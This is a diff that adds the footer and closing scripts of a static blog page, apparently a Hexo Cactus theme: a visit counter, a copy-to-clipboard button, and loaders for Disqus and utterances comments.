+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
